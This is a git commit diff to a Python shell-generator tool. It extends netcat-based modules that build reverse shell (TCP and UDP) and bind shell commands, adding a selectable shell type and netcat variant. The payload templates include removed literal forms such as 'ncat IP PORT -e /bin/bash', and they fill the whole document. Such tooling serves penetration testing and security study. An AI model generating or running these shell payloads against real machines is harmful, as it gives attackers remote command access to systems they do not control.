237170ec91869fec5c179c48bb9392e4b4dc43ee
Nong Hoang Tu <dmknght@parrotsec.org>
2020-12-27 02:39:35 +0700

    Add support selectable shell type, nc type

--- shellgen/modules/multi/ncat.py
+++ shellgen/modules/multi/ncat.py
@@ -14,6 +14,16 @@ class ReverseShell(plugin.Module):
             help="Select netcat type: tradition, ncat (default: ncat)"
         )
         self.add_args(
+            "--shell",
+            default="bash",
+            choices=[
+                'bash',
+                'sh',
+                'dash'
+            ],
+            help="Select shell type on target machine"
+        )
+        self.add_args(
             "--ip",
             help="IP address"
         )
@@ -21,16 +31,26 @@ class ReverseShell(plugin.Module):
             "--port",
             help="Port address"
         )
-        self.opts.description = "Generate reverse shell using ncat"
+        self.opts.description = "[ReverseShell][TCP] Netcat"
 
     def make_shell(self):
-        self.shell = "ncat {} {} -e /bin/bash".format(self.args.ip, self.args.port)  # TODO add custom option for shell
+        self.shell = "{} {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)
 
 
 class ReverseShellUDP(plugin.Module):
     def __init__(self):
         super().__init__()
         self.add_args(
+            "--shell",
+            default="bash",
+            choices=[
+                'bash',
+                'sh',
+                'dash'
+            ],
+            help="Select shell type on target machine"
+        )
+        self.add_args(
             "--ip",
             help="IP address"
         )
@@ -38,16 +58,25 @@ class ReverseShellUDP(plugin.Module):
             "--port",
             help="Port address"
         )
-        self.opts.description = "Generate reverse shell using ncat"
-        self.shell = "ncat --udp {} {} -e /bin/bash"  # TODO add custom options for shell
+        self.opts.description = "[ReverseShell][UDP] Netcat"
 
     def make_shell(self):
-        self.shell = "ncat --udp {} {} -e /bin/bash".format(self.args.ip, self.args.port)
+        self.shell = "{} --udp {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)
 
 
 class BindShell(plugin.Module):
     def __init__(self):
         super().__init__()
+        self.add_args(
+            "--shell",
+            default="bash",
+            choices=[
+                'bash',
+                'sh',
+                'dash'
+            ],
+            help="Select shell type on target machine"
+        )
         self.add_args(
             "--type",
             default="ncat",
@@ -61,7 +90,7 @@ class BindShell(plugin.Module):
             "--port",
             help="Port address"
         )
-        self.opts.description = "Generate bind shell using ncat"
+        self.opts.description = "[BindShell][TCP] Netcat"
 
     def make_shell(self):
-        self.shell = "ncat -l {} -e /bin/sh".format(self.args.port)
+        self.shell = "{} -l {} -e {}".format(self.args.type, self.args.port, self.args.shell)
